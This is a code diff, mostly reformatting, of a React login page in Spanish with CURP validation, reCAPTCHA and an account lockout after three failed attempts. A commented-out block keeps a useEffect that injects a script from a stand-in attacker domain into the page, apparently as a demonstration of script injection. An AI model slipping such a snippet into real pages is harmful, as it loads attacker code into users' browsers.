@@ -5,16 +5,19 @@ import axios from "axios";
 import { Header } from "../components/Header";
 import { Footer } from "../components/Footer";
 import { Link } from "react-router-dom";
-import { ScrollToTop } from "../components/ScrollToTop"; 
+import { ScrollToTop } from "../components/ScrollToTop";
 import { Form, Input, Button, Select, message, notification } from "antd";
-import { CheckCircleOutlined, LockOutlined, IdcardOutlined } from "@ant-design/icons";
+import {
+  CheckCircleOutlined,
+  LockOutlined,
+  IdcardOutlined,
+} from "@ant-design/icons";
 import { Subtitulo, Contenido } from "../components/Titulos";
 import ReCAPTCHA from "react-google-recaptcha";
 import { CSPMetaTag } from "../components/CSPMetaTag";
 const { Option } = Select;
- 
-export function Login() {
 
+export function Login() {
   const [form] = Form.useForm();
   const [formValues, setFormValues] = useState({});
   const [buttonBlocked, setButtonBlocked] = useState(false);
@@ -24,7 +27,8 @@ export function Login() {
     setFormValues(allValues);
   };
 
-  {/*
+  {
+    /*
 useEffect(() => {
     const maliciousScript = document.createElement('script');
     maliciousScript.src = 'http://www.evil-website.com/malicious-script.js';
@@ -34,7 +38,8 @@ useEffect(() => {
         document.body.removeChild(maliciousScript);
     };
 }, []);
-*/}
+*/
+  }
 
   const [userRole, setUserRole] = useState(null);
   const onChange = () => {
@@ -58,25 +63,28 @@ useEffect(() => {
   // funcion para indicar que no existireron muchos intentos
   const updateMessageText = () => {
     const { minutes, seconds } = calculateTimeRemaining();
-    setMessageText(`Se ha excedido el número de intentos. Favor de esperar 5 minutos.`
+    setMessageText(
+      `Se ha excedido el número de intentos. Favor de esperar 5 minutos.`
     );
   };
 
   const onFinish = async (values) => {
     try {
-      const response = await axios.post("https://fast-dusk-08901-dd3e17a6f757.herokuapp.com/login", {
-     
-        curp: values.curp,
-        contrasena: values.contrasena,
-      });
-  
+      const response = await axios.post(
+        "https://fast-dusk-08901-dd3e17a6f757.herokuapp.com/login",
+        {
+          curp: values.curp,
+          contrasena: values.contrasena,
+        }
+      );
+
       if (response.data.success) {
         console.log("Inicio de sesión exitoso");
         message.success("Inicio de sesión exitoso");
         localStorage.setItem("userRole", response.data.role);
         const userRole = response.data.role;
         setUserRole(userRole);
-  
+
         // Redirigir a la ruta correspondiente según el rol
         if (userRole === 1) {
           navigate("/");
@@ -87,26 +95,28 @@ useEffect(() => {
         } else {
           navigate("/"); // Redirige a la ruta predeterminada si el rol no coincide con ninguno de los casos anteriores
         }
-      }  else {
+      } else {
         // Inicio de sesión fallido
         message.error(response.data.message || "Credenciales incorrectas");
         const updatedFailedAttempts = failedAttempts + 1;
         setFailedAttempts(updatedFailedAttempts);
-  
+
         // Si hay 3 intentos fallidos, actualizar estado_cuenta a 2
         if (updatedFailedAttempts === 3) {
           try {
             message.error("Cuenta bloqueada.");
-            await axios.post("https://fast-dusk-08901-dd3e17a6f757.herokuapp.com/updateEstadoCuenta", {
-              curp: values.curp,
-            });
+            await axios.post(
+              "https://fast-dusk-08901-dd3e17a6f757.herokuapp.com/updateEstadoCuenta",
+              {
+                curp: values.curp,
+              }
+            );
             setButtonBlocked(true); // Bloquear el botón
           } catch (error) {
             console.error("Error al actualizar estado_cuenta:", error);
           }
         }
       }
-      
     } catch (error) {
       console.error("Error al iniciar sesión:", error);
       message.error("Inicio de sesión fallido: Usuario no encontrado.");
@@ -149,7 +159,8 @@ useEffect(() => {
                       throw new Error("La CURP solo debe contener mayúsculas");
                     }
                     const uppercasedValue = trimmedValue.toUpperCase();
-                    const pattern = /^[A-Z]{4}\d{6}[HM]{1}[A-Z\d]{5}[0-9A-Z]{2}$/;
+                    const pattern =
+                      /^[A-Z]{4}\d{6}[HM]{1}[A-Z\d]{5}[0-9A-Z]{2}$/;
                     if (uppercasedValue.length !== 18) {
                       throw new Error(
                         "La CURP debe tener 18 letras mayúsculas/números)"
@@ -206,26 +217,36 @@ useEffect(() => {
               ]}
             >
               <ReCAPTCHA
-                sitekey="6LdZ4IMpAAAAADeX3M_zwV4kduNHhAhd7Ad6xUEx" 
-                onChange={onChange}/>
+                sitekey="6LfPh4UpAAAAADrQnchMkx5WoF9InHXo0jYAt2JC"
+                onChange={onChange}
+              />
             </Form.Item>
 
             {messageText && (
               <p style={{ color: "red", textAlign: "center" }}>{messageText}</p>
             )}
- 
-{buttonBlocked && (
-  <div style={{ color: 'red', marginTop: '10px' }}>
-    Su cuenta ha sido bloqueada. Revise su correo para instrucciones de recuperación.
-  </div>
-)}
 
-<Form.Item>
-  <Button type="primary" htmlType="submit" disabled={!formValues.curp || !formValues.contrasena || !formValues.recaptcha || buttonBlocked}>
-    Ingresar
-  </Button>
-</Form.Item>
+            {buttonBlocked && (
+              <div style={{ color: "red", marginTop: "10px" }}>
+                Su cuenta ha sido bloqueada. Revise su correo para instrucciones
+                de recuperación.
+              </div>
+            )}
 
+            <Form.Item>
+              <Button
+                type="primary"
+                htmlType="submit"
+                disabled={
+                  !formValues.curp ||
+                  !formValues.contrasena ||
+                  !formValues.recaptcha ||
+                  buttonBlocked
+                }
+              >
+                Ingresar
+              </Button>
+            </Form.Item>
           </Form>
         </div>
       </div>
